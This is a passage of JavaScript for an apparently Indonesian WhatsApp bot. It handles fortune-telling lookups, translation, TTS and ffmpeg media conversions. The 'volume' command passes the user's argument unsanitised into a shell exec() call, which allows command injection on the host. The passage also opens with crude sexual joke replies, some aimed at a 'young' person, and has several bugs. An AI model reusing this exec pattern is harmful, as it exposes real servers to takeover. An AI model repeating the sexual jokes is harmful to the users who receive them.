        "9%\n\nMasih Kecil Ini Mah Ketutup Ama bulu komt nya🗿 Ae",
        "Nakk Masih Kecil, jangan kebanyakan nonton film dewasa ya!",
        "28%\n\nYoalahh hmm, mungkin masih perlu banyak belajar.",
        "34%\n\nMayan Lah, tapi jangan baper ya!",
        "48%\n\nGatau, kayaknya ini sih dari katalog 'biasa'!",
        "59%\n\nBiasa Kang Coli Mah Tityd nya Item🗿, ada yang mau berbagi tips?",
        "Apacoba\nKasian Mana Masih Muda, ayo jangan terjebak!",
        "Itu tityd apa terong? Ayo kita panggang!",
        "Ya Ampun, mau jadi juragan tityd atau gimana?"
    ];
    
    const ehan = bucin[Math.floor(Math.random() * bucin.length)];
    const jwbnya = `*${persenbucin}*\nJawaban: ${ehan}`;
    let JWb = Ehztext(jwbnya)
    sendButDoc(JWb, 'CekMemek', 'cekmemek');
    break;

  case 'artinama': {
if (!q) return setReply( `Example : ${prefix + command} Ehanz Dhoanx`)
let anu = await primbon.arti_nama(q)
if (anu.status == false) return m.reply(anu.message)
let teks = Ehztext(`
∘ *Nama :* ${anu.message.nama}
∘ *Arti :* ${anu.message.arti}
∘ *Catatan :* ${anu.message.catatan}`)
setReply(teks)
}
break	
case 'artimimpi': case 'tafsirmimpi': {
if (!q) return setReply( `Example : ${prefix + command} belanja`)
let anu = await primbon.tafsir_mimpi(q)
if (anu.status == false) return m.reply(anu.message)
let teks = Ehztext(`
• *Mimpi :* ${anu.message.mimpi}
• *Arti :* ${anu.message.arti}
• *Solusi :* ${anu.message.solusi}`)
setReply(teks)
}
break
 case 'pasangan': {
if (!q) return setReply( `Example : ${prefix + command} Ehanz|Angel`)
let [nama1, nama2] = q.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return m.reply(anu.message)
let teks = Ehztext(`
• *Nama Anda :* ${anu.message.nama_anda}
• *Nama Pasangan :* ${anu.message.nama_pasangan}
• *Sisi Positif :* ${anu.message.sisi_positif}
• *Sisi Negatif :* ${anu.message.sisi_negatif}`)
setReply(teks)
}
break   
case 'ramalancinta': case 'ramalcinta': {
if (!q) return setReply( `Example : ${prefix + command} ehanz, 28, 6, 2004, angel, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
let teks = Ehztext(`
• *Nama Anda :* ${anu.message.nama_anda.nama}
• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}
• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}
• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}
• *Sisi Positif :* ${anu.message.sisi_positif}
• *Sisi Negatif :* ${anu.message.sisi_negatif}
• *Catatan :*
${anu.message.catatan}`)
setReply(teks)
}
break   
case 'kecocokannama': 
case 'cocoknama': {
if (!q) return setReply( `Example : ${prefix + command} Ehanz, 28, 6, 2004`)
let [nama, tgl, bln, thn] = q.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = Ehztext(`
• *Nama :* ${anu.message.nama}
• *Lahir :* ${anu.message.tgl_lahir}
• *Life Path :* ${anu.message.life_path}
• *Destiny :* ${anu.message.destiny}
• *Destiny Desire :* ${anu.message.destiny_desire}
• *Personality :* ${anu.message.personality}
• *Persentase :* ${anu.message.persentase_kecocokan}`)
setReply(teks)
}
break 
    case 'kecocokanpasangan':
case 'cocokpasangan':
case 'pasangan': {
if (!q) return setReply( `Example : ${prefix + command} Dika|Novia`)
let [nama1, nama2] = q.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return m.reply(anu.message)
let teks = Ehztext(`
• *Nama Anda :* ${anu.message.nama_anda}
• *Nama Pasangan :* ${anu.message.nama_pasangan}
• *Sisi Positif :* ${anu.message.sisi_positif}
• *Sisi Negatif :* ${anu.message.sisi_negatif}`)
setReply(teks)
}
break
case 'jadiannikah': {
if (!q) return setReply( `Example : ${prefix + command} 6, 12, 2020`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = Ehztext(`
• *Tanggal Pernikahan :* ${anu.message.tanggal}
• *karakteristik :* ${anu.message.karakteristik}`)
setReply(teks)
}
break
case 'sifatusaha': {
if (!q) return setReply( `Example : ${prefix + command} 28, 12, 2021`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = Ehztext(`
• *Lahir :* ${anu.message.hari_lahir}
• *Usaha :* ${anu.message.usaha}`)
setReply(teks)
}
break
    case 'rejeki': 
case 'rezeki': {
if (!q) return setReply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = Ehztext(`
• *Lahir :* ${anu.message.hari_lahir}
• *Rezeki :* ${anu.message.rejeki}
• *Catatan :* ${anu.message.catatan}`)
setReply(teks)
}
break
case 'pekerjaan':  {
if (!q) return setReply( `Example : ${prefix + command}  7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = Ehztext(`
• *Lahir :* ${anu.message.hari_lahir}
• *Pekerjaan :* ${anu.message.pekerjaan}
• *Catatan :* ${anu.message.catatan}`)
setReply(teks)
}
break
case 'ramalnasib': 
case 'nasib': {
if (!q) return setReply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = Ehztext(`
• *Analisa :* ${anu.message.analisa}
• *Angka Akar :* ${anu.message.angka_akar}
• *Sifat :* ${anu.message.sifat}
• *Elemen :* ${anu.message.elemen}
• *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`)
setReply(teks)
}
break 
case 'penyakit': {
if (!q) return setReply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = Ehztext(`
• *Analisa :* ${anu.message.analisa}
• *Sektor :* ${anu.message.sektor}
• *Elemen :* ${anu.message.elemesektorn}
• *Catatan :* ${anu.message.catatan}`)
setReply(teks)
}
break
case 'artitarot': 
case 'tarot': {
if (!q) return setReply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = Ehztext(`
• *Lahir :* ${anu.message.tgl_lahir}
• *Simbol Tarot :* ${anu.message.simbol_tarot}
• *Arti :* ${anu.message.arti}
• *Catatan :* ${anu.message.catatan}`)
setReply(teks)
}
break
case 'fengshui': {
if (!q) return setReply( `Example : ${prefix + command} Rangel, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`)
let [nama, gender, tahun] = q.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return m.reply(anu.message)
let teks = Ehztext(`
• *Nama :* ${anu.message.nama} 
• *Lahir :* ${anu.message.tahun_lahir}
• *Gender :* ${anu.message.jenis_kelamin}
• *Angka Kua :* ${anu.message.angka_kua}
• *Kelompok :* ${anu.message.kelompok}
• *Karakter :* ${anu.message.karakter}
• *Sektor Baik :* ${anu.message.sektor_baik}
• *Sektor Buruk :* ${anu.message.sektor_buruk}`)
setReply(teks)
}
break
case 'haribaik': {
if (!q) return setReply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = Ehztext(`
• *Lahir :* ${anu.message.tgl_lahir}
•™*Kala Tinantang :* ${anu.message.kala_tinantang}
• *Info :* ${anu.message.info}
• *Catatan :* ${anu.message.catatan}`)
setReply(teks)
}
break
case 'harisangar': 
case 'taliwangke': {
if (!q) return setReply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = Ehztext(`
• *Lahir :* ${anu.message.tgl_lahir}
• *Hasil :* ${anu.message.result}
• *Info :* ${anu.message.info}
• *Catatan :* ${anu.message.catatan}`)
setReply(teks)
}
break
case 'harisial': {
if (!q) return setReply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = Ehztext(`
• *Hari Lahir :* ${anu.message.hari_lahir}
• *Tanggal Lahir :* ${anu.message.tgl_lahir}
• *Hari Naas :* ${anu.message.hari_naas}
• *Info :* ${anu.message.catatan}
• *Catatan :* ${anu.message.info}`)
setReply(teks)
}
break
case 'harinaga': {
if (!q) return setReply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = Ehztext(`
• *Hari Lahir :* ${anu.message.hari_lahir}
• *Tanggal Lahir :* ${anu.message.tgl_lahir}
• *Arah Naga Hari :* ${anu.message.arah_naga_hari}
• *Catatan :* ${anu.message.catatan}`)
setReply(teks)
}
break
case 'arahrejeki': 
case 'arahrezeki': {
if (!q) return setReply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Hari Lahir :* ${anu.message.hari_lahir}
• *tanggal Lahir :* ${anu.message.tgl_lahir}
• *Arah Rezeki :* ${anu.message.arah_rejeki}
• *Catatan :* ${anu.message.catatan}`
setReply(teks)
}
break
case 'peruntungan': {
if (!q) return setReply( `Example : ${prefix + command} Ehanz, 28, 6, 2004, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
let [nama, tgl, bln, thn, untuk] = q.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return m.reply(anu.message)
let teks = Ehztext(`
• *Nama :* ${anu.message.nama}
• *Lahir :* ${anu.message.tgl_lahir}
• *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}
• *Hasil :* ${anu.message.result}
• *Catatan :* ${anu.message.catatan}`)
}
break
case 'weton': 
case 'wetonjawa': {
if (!q) return setReply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = Ehztext(`
• *Tanggal :* ${anu.message.tanggal}
• *Jumlah Neptu :* ${anu.message.jumlah_neptu}
• *Watak Hari :* ${anu.message.watak_hari}
• *Naga Hari :* ${anu.message.naga_hari}
• *Jam Baik :* ${anu.message.jam_baik}
• *Watak Kelahiran :* ${anu.message.watak_kelahiran}`)
setReply(teks)
}
break
case 'karakter': {
if (!q) return setReply( `Example : ${prefix + command} Ehanz, 28, 6, 2004`)
let [nama, tgl, bln, thn] = q.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = Ehztext(`
• *Nama :* ${anu.message.nama}
• *Lahir :* ${anu.message.tgl_lahir}
• *Garis Hidup :* ${anu.message.garis_hidup}`)
setReply(teks)
}
break
case 'keberuntungan': {
if (!q) return setReply( `Example : ${prefix + command} Ehanz, 28, 6, 2004`)
let [nama, tgl, bln, thn] = q.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = Ehztext(`
• *Nama :* ${anu.message.nama}
• *Lahir :* ${anu.message.tgl_lahir}
• *Hasil :* ${anu.message.result}`)
setReply(teks)
}
break
case 'masasubur': {
if (!q) return setReply( `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`)
let [tgl, bln, thn, siklus] = q.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return m.reply(anu.message)
let teks = Ehztext(`
•  *Hasil :* ${anu.message.result}
•  *Catatan :* ${anu.message.catatan}`)
setReply(teks)
}
break
  case 'zodiak': 
case 'zodiac': {
if (!q) return setReply( `Example : ${prefix + command} 7 7 2005`)
let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
].reverse()
function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(q)
if (date == 'Invalid Date') throw date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
let zodiac = await getZodiac(birth[1], birth[2])
let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return m.reply(anu.message)
let teks = Ehztext(`
∘ *Zodiak :* ${anu.message.zodiak}
∘ *Nomor :* ${anu.message.nomor_keberuntungan}
∘ *Aroma :* ${anu.message.aroma_keberuntungan}
∘ *Planet :* ${anu.message.planet_yang_mengitari}
∘ *Bunga :* ${anu.message.bunga_keberuntungan}
∘ *Warna :* ${anu.message.warna_keberuntungan} 
∘ *Batu :* ${anu.message.batu_keberuntungan}
∘ *Elemen :* ${anu.message.elemen_keberuntungan}
∘ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}
∘ *Catatan :* ${anu.message.catatan}`)
setReply(teks)
}
break
// ==≠======= FITUR CONVERT ======== //
case 'kodebahasa':{
	let LANGUAGES = `
	*╭─❲ KODE BAHASA ❳*
	*│*
	*│▸* af: Afrikaans 
	*│▸* sq: Albanian
	*│▸* ar: Arabic
	*│▸* hy: Armenian
	*│▸* ca: Catalan 
	*│▸* zh: Chinese 
	*│▸* zh-cn: Chinese (Mandarin/China)
	*│▸* zh-tw: Chinese (Mandarin/Taiwan)
	*│▸* zh-yue: Chinese (Cantonese)
	*│▸* hr: Croatian
	*│▸* cs: Czech
	*│▸* da: Danish
	*│▸* nl: Dutch
	*│▸* en: English    
	*│▸* en-au: English (Australia)
	*│▸* en-uk: English (United Kingdom)
	*│▸* en-us: English (United States) 
	*│▸* eo: Esperanto 
	*│▸* fi: Finnish 
	*│▸* fr: French
	*│▸* de: German
	*│▸* el: Greek 
	*│▸* ht: Haitian Creole 
	*│▸* hi: Hindi 
	*│▸* hu: Hungarian 
	*│▸* is: Icelandic 
	*│▸* id: Indonesian 
	*│▸* it: Italian
	*│▸* ja: Japanese
	*│▸* ko: Korean
	*│▸* la: Latin
	*│▸* lv: Latvian
	*│▸* mk: Macedonian
	*│▸* no: Norwegian
	*│▸* pl: Polish
	*│▸* pt: Portuguese
	*│▸* pt-br: Portuguese (Brazil)
	*│▸* ro: Romanian
	*│▸* ru: Russian
	*│▸* sr: Serbian
	*│▸* sk: Slovak
	*│▸* es: Spanish 
	*│▸* es-es: Spanish (Spain)
	*│▸* es-us: Spanish (United States)
	*│▸* sw: Swahili
	*│▸* sv: Swedish
	*│▸* ta: Tamil
	*│▸* th: Thai
	*│▸* tr: Turkish
	*│▸* vi: Vietnamese 
	*│▸* cy: Welsh
	*│*
	*╰────────────⦁*`
	setReply(LANGUAGES)
	}
	break
 case 'sad': {
    const sadNumber = parseInt(args[0], 10); 
    if (isNaN(sadNumber) || sadNumber < 1 || sadNumber > 34) {
        return m.reply('Masukkan nomor antara 1 dan 34\nContoh: .sad 2');
    }

    let contextInfo = {
        externalAdReply: {
            showAdAttribution: true, 
            title: `🎼 Melodi Sedih: Perjalanan Emosi 🎵`, 
            body: `💔 Biarkan lagu-lagu ini menyentuh hatimu. Klik untuk mendengarkan.`,
            description: 'Masuki kedalaman kesedihan...',
            mediaType: 2,
            thumbnailUrl: pickRandom(global.fotoRandom),
            mediaUrl: 'https://youtu.be/lKfgv1-3Ty4?si=jvWuT5H-WRJcI2Ey'
        }
    };

   
    const sadURL = `https://github.com/Rangelofficial/Sad-Music/raw/main/audio-sad/sad${sadNumber}.mp3`;

    try {
       
        const response = await fetch(sadURL);
        if (!response.ok) throw new Error("Gagal mengunduh audio");
        const sadBuffer = await response.buffer();

       
        await hanz.sendMessage(from, { 

            audio: sadBuffer, 

            mimetype: 'audio/mp4', 

            ptt: true, 

            contextInfo 

        }, { quoted: m });
        
    } catch (error) {
        m.reply("Terjadi kesalahan saat mengunduh atau mengirim audio.");
        console.error(error);
    }
}
break;

  
case 'citacita': {
    // Pilih nomor secara acak antara 1 dan 34
    const citaNumber = Math.floor(Math.random() * 34) + 1; 
    
    let contextInfo = {
        externalAdReply: {
            showAdAttribution: false, 
            title: `🌟 Cita-Cita: Impian yang Menginspirasi 🎯`, 
            body: `✨ Dengarkan lagu yang membangkitkan semangatmu. Klik untuk mendengarkan.`,
            description: 'Mengejar impianmu...',
            mediaType: 2,
            thumbnailUrl: 'https://pomf2.lain.la/f/4v2hxdto.jpg',
            mediaUrl: 'https://youtu.be/lKfgv1-3Ty4?si=jvWuT5H-WRJcI2Ey'
        }
    }

    // Ubah URL GitHub ke versi raw
    const citaURL = `https://raw.githubusercontent.com/BadXyz/txt/main/citacita/citacita${citaNumber}.mp3`;

    const citaBuffer = await getBuffer(citaURL);

    await hanz.sendMessage(from, {  mimetype: 'audio/mpeg', ptt:true, audio: citaBuffer }, { quoted: m });
}
break;


	case 'sound': {
    const soundNumber = parseInt(args[0], 10); // Gunakan basis 10 untuk parsing angka

    if (isNaN(soundNumber) || soundNumber < 1 || soundNumber > 161) {
        return m.reply('Masukkan nomor suara antara 1 dan 161\nContoh .sound 2');
    }

    await loading(); // Pastikan fungsi loading() ada dan sesuai kebutuhan

    const soundURL = `https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/sound${soundNumber}.mp3`;
    const soundBuffer = await getBuffer(soundURL); // Pastikan fungsi getBuffer() ada dan sesuai kebutuhan

    await sendMusic(soundBuffer)
}
break;
case 'tts':
if (!isGroup) return onlyToko()
if (!q) setReply( `Use Example ${prefix}${command} Ara ara`)
const gtts = require( 'node-gtts')
//const { gtts } = await import( 'node-gtts')
function tts(text, lang = 'id') {
// console.log(lang, text)
return new Promise((resolve, reject) => {
try {
let tts = gtts(lang)
let filePath =  (1 * new Date) + '.mp3'
tts.save(filePath, text, () => {
resolve(fs.readFileSync(filePath))
fs.unlinkSync(filePath)
})
} catch (e) { reject(e) }
})
}
	
const defaultLang = 'id'
	
	
let lang = args[0]
let text = args.slice(1).join(' ')
if ((args[0] || '').length !== 2) {
lang = defaultLang
text = args.join(' ')
}
if (!text && m.quoted?.text) text = m.quoted.text
	
let ras
try { ras = await tts(text, lang) }
catch (e) {
m.reply(e + '')
text = args.join(' ')
if (!text) setReply( `Use Example ${prefix}${command} Hello world\nketik .kodebahasa untuk list bahasa`)
ras = await tts(text, defaultLang)
} finally {
if (ras) hanz.sendMedia(from, ras, m, {caption: `${mess.success}`})
}
break
  case 'tr': case 'translate':{
if (!isGroup) return onlyToko()
let translate = require('translate-google-api')
let defaultLang = 'en'
let tld = 'cn'
let toks = `
Contoh:
${prefix + command} <lang> [text]
${prefix + command} id your messages
Daftar bahasa yang didukung: https://cloud.google.com/translate/docs/languages
 `.trim()

let lang = args[0]
let text = args.slice(1).join(' ')
if ((args[0] || '').length !== 2) {
lang = defaultLang
text = args.join(' ')
}
if (!text && m.quoted && m.quoted.text) text = m.quoted.text
let result
try {
result = await translate(`${text}`, {to: lang})
} catch (e) {
result = await translate(`${text}`, {to: defaultLang,})
setReply(toks)
} finally {
setReply(result[0])
}
}
break
case 'bass': 
case 'blown': 
case 'deep': 
case 'earrape': 
case 'fast': 
case 'fat': 
case 'robot': 
case 'slow': 
case 'smooth': 
case 'chipmunk': // Efek suara anime
case 'reverb': // Efek suara anime
case 'vocaloid': // Efek suara anime
case 'reverse': // Efek suara baru
case 'nightcore': // Efek suara baru
if (!isGroup) return onlyToko();

try {
  let set;
  
  if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20';
  if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log';
  if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3';
  if (/earrape/.test(command)) set = '-af volume=12';
  if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"';
  if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"';
  if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"';
  if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"';
  if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"';
  if (/chipmunk/.test(command)) set = '-filter:a "atempo=1.5,asetrate=44100*1.5"';
  if (/reverb/.test(command)) set = '-af "aecho=0.8:0.9:1000:0.3"';
  if (/vocaloid/.test(command)) set = '-af "rubberband=tempo=1.2"';
  if (/reverse/.test(command)) set = '-filter:a "areverse"'; // Efek reverse
  if (/nightcore/.test(command)) set = '-filter:a "atempo=1.25,asetrate=44100*1.25"'; // Efek nightcore

  if (/audio/.test(mime)) {
    await loading();
    let media = await hanz.downloadAndSaveMediaMessage(quoted);
    let ran = getRandom('.mp3');
    
    exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
      fs.unlinkSync(media);
      if (err) return m.reply(err);
      
      let buff = fs.readFileSync(ran);
      sendMusic(buff);
      fs.unlinkSync(ran);
    });
  } else {
    setReply(`Reply audionya!`);
  }
} catch (e) {
  setReply(e);
}
break;




case 'speed-up':
if (isQuotedAudio) { 
  await loading();
  let medoi = await hanz.downloadAndSaveMediaMessage(quoted);
  let ran = getRandom('.mp3');
  exec(`ffmpeg -i ${medoi} -filter:a "atempo=1.1,asetrate=65100" ${ran}`, async (err, stderr, stdout) => {
    fs.unlinkSync(medoi);
    if (err) return setReply('Error!');
    let buffer453 = fs.readFileSync(ran);
    sendMusic(buffer453);
    fs.unlinkSync(ran);
  });
} else {
  setReply('Reply audionya');
}
break
case 'ghost':
if(isQuotedAudio) { 
  await loading()
let mele = await hanz.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${mele} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(mele)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
sendMusic(buffer453)
fs.unlinkSync(ran)
}) 
} else {
setReply('Reply audionya')
}
break
case 'hode':
if(isQuotedAudio) { 
  await loading()
let medok = await hanz.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${medok} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(medok)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
sendMusic(buffer453)
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break

case 'tupai':
if(isQuotedAudio) { 
  await loading()
let medoi = await hanz.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${medoi} -filter:a "atempo=0.8,asetrate=65100" ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(medoi)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
sendMusic(buffer453)
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break
case 'imut':
if(isQuotedAudio) { 
  await loading() 
let masa = await hanz.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${masa} -af atempo=1/2,asetrate=44500*2/1 ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(masa)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
sendMusic(buffer453)
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break
case 'toimg': {
if (!isGroup) return onlyToko()
if (!isQuotedSticker) return setReply('Reply stickernya') 
await loading()
let data = global.db.data.others['runtime']
let time = (new Date - data.runtime) || "Tidak terdeteksi"
let media = await hanz.downloadAndSaveMediaMessage(quoted,makeid(5))
let ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply(err)
let buffer = fs.readFileSync(ran)
hanz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${botName}`, mediaType: 3,  renderLargerThumbnail : false,thumbnail: thumb,sourceUrl: `https://wa.me/${nomerOwner}`
}}, image: buffer, caption: `${mess.success}`}, { quoted: m })
fs.unlinkSync(ran)
})
}
break
case 'tomp4':
case 'tovideo':
if (!isGroup) return onlyToko()
if (!isPremium && global.db.data.users[sender].limit < 1) return onlyLimit()
if (isQuotedSticker) {
  await loading()
let data = global.db.data.others['runtime']
let time = (new Date - data.runtime) || "Tidak terdeteksi"
let file = await hanz.downloadAndSaveMediaMessage(quoted,makeid(5))
let outGif = `./${getRandom('.gif')}`
let outMp4 = `./${getRandom('.mp4')}`
//convert webp ke gif pakai imagemagick
exec(`convert ${file} ${outGif}`, (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}

//lalu convert gif ke mp4 pakai ffmpeg
exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, async (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}
hanz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${wm}`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: thumb,sourceUrl: `https://wa.me/${nomerOwner}`
}}, video: fs.readFileSync(outMp4), caption: `${mess.success}`}, { quoted: m })	
fs.unlinkSync(outGif)
fs.unlinkSync(outMp4)
fs.unlinkSync(file)
})
})
db.data.users[sender].limit -= 1 
}
break
case 'toptv':{
try {
  if (!isGroup) return onlyToko()
await loading()
if (m.message.extendedTextMessage) {
  var dataVideo = { ptvMessage: m.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage }
 hanz.relayMessage(m.chat, dataVideo, {})
 }
    } catch (error) {
        m.reply('reply video atau kirim video');
        }
        }
        break
case 'toptt':
case 'tovn':
if (!isGroup) return onlyToko()
if (!isPremium && global.db.data.users[sender].limit < 1) return onlyLimit()
if (isQuotedAudio){
await loading()
let media = await hanz.downloadAndSaveMediaMessage(quoted,makeid(5))
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply('Gagal mengkonversi audio ke ptt')
let topt = fs.readFileSync(ran)
await hanz.sendMessage(from,{audio: topt, mimetype: 'audio/mp4', ptt:true}, {quoted: m})
fs.unlinkSync(ran)
})
} else {
setReply("Reply audio")
db.data.users[sender].limit -= 1 
}
break
case 'togif': {
				if (!/webp/.test(mime) && !/video/.test(mime)) return reply(`Reply Video/Sticker with caption *${prefix + command}*`)
				reply(mess.wait)
				let { webp2mp4File } = require('../lib/uploader')
				let media = await hanz.downloadAndSaveMediaMessage(quoted)
				let webpToMp4 = await webp2mp4File(media)
				await hanz.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
				await fs.unlinkSync(media)
			}
			break
      
case 'tomp3':
if (!isGroup) return onlyToko()
if (isQuotedVideo || isVideo) {
await loading()
let media = await hanz.downloadAndSaveMediaMessage(quoted,makeid(5))
let ran = getRandomFile('.mp3')
exec(`ffmpeg -i ${media} -vn ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
await hanz.sendMessage(from, {mimetype: 'audio/mp4', audio: buffer453}, { quoted: m })
fs.unlinkSync(ran)
})
} else {
setReply("Reply videonya")
}
break
case 'volume':
if (!isGroup) return onlyToko()
if (!isPremium && global.db.data.users[sender].limit < 1) return onlyLimit()
if (Number(args[0]) >= 11) return setReply("Maksimal volume adalah 10")
await loading()
if (isQuotedAudio){
let media3 = await hanz.downloadAndSaveMediaMessage(quoted,makeid(5))
let rname = getRandom('.mp3')
exec(`ffmpeg -i ${media3} -filter:a "volume=${args[0]}" ${rname}`, async (err, stderr, stdout) => {
if (err) return setReply('Error!')
let jadie = fs.readFileSync(rname)
await hanz.sendMessage(from, {audio: jadie, mimetype: 'audio/mp4', ptt: true }, {quoted: m})
